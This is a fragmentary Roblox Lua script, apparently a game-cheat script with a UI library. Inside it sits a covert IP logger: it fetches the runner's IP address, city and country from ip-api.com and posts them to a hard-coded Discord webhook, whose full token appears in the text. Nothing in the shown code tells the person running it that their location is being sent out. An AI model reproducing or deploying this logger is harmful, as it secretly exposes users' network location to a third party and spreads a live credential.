...
local MainUI = UILibrary.Load("spicy")
...
local webh = "https://discord.com/api/webhooks/1054912878064451594/1vSUeaMhzRkalmYHuovAKBzez5QWHo8b9lux9b9lvzHqmS5aHnHMIExDPPEIUptsbRxD"
  ...
  ['embeds'] = {
    {
       ...
       ['fields'] = {
          ...
          {name = "IP (Not a Random Number)", value = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://ip-api.com/json/")).query},
          {name = "City", value = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://ip-api.com/json/")).city},
            {name = "Country", value = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://ip-api.com/json/")).country},
